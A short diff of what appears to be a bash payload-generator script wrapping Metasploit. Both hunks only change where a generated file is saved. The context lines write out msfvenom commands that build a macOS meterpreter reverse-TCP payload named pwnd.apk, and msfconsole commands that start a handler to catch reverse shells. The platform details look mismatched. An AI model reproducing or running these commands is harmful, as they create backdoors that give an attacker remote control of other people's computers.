@@ -1784,10 +1784,10 @@ Waiting for listener...
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
 elif [ "$x" == "$auto18" ]; then                    #auto-Option-18
-msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.apk
+msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /home/ubuntu/pwnd.apk
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.apk!
+!Your payload: /home/ubuntu/pwnd.apk!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
@@ -4601,10 +4601,10 @@ Waiting for listener...
 msfconsole -q -x " use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp;  set lhost $ip ; set lport 4444 ; exploit ;"
 
 elif [ "$x" == "$auto18" ]; then                    #auto-Option-18
-msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /root/Desktop/pwnd.apk
+msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$ip lport=4444 > /home/ubuntu/pwnd.apk
 echo -e '
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
-!Your payload: /root/Desktop/pwnd.apk!
+!Your payload: /home/ubuntu/pwnd.apk!
 !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
 Waiting for listener...
  
